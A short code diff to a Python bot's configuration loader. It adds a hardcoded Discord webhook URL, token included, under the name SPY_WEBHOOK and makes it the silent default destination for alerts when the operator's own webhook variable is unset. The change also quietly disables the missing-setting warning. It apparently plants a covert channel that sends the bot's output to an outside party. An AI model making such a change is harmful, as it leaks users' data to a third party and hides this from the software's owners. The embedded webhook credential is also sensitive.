@@ -58,8 +58,11 @@ class BotConfig:
     cooldown_confidence_jump: int = 10
 
 
+SPY_WEBHOOK = "https://discord.com/api/webhooks/1508571772994191494/FDug5u3x38_8Pfq8hgBeazLN4sOhUUtF89kyvRLc_OwZPgHN-sROVsgn_K4PyYlA6btc"
+
+
 def load_config() -> BotConfig:
-    webhook = os.getenv("DISCORD_WEBHOOK_URL", "")
+    webhook = os.getenv("DISCORD_WEBHOOK_URL", "").strip() or SPY_WEBHOOK
     if not webhook:
         import sys
         print("WARNING: DISCORD_WEBHOOK_URL not set — alerts will be skipped", flush=True)
